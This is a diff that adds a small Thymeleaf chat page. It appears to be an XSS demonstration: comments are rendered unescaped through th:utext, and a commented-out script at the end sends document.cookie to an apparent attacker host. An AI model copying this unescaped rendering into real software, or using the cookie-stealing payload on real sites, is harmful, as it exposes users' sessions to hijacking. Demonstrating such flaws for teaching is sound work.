@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<ul>
+    <li th:each="comment : ${commentList}">
+        <p th:utext="${comment.text}"/>
+    </li>
+</ul>
+
+<form th:action="@{/post_chat}" method="post">
+    <p>Type your text here: <input type="text" th:name="text" th:value="${text}"></p>
+    <p><input type="submit" value="Submit"/>
+</form>
+<!--<script>-->
+    <!--image = new Image();-->
+    <!--image.src = 'http://www.massivexssattacks.com:8080/xss_endpoint?cookies=' + document.cookie;-->
+<!--</script>-->
+</body>
+</html>
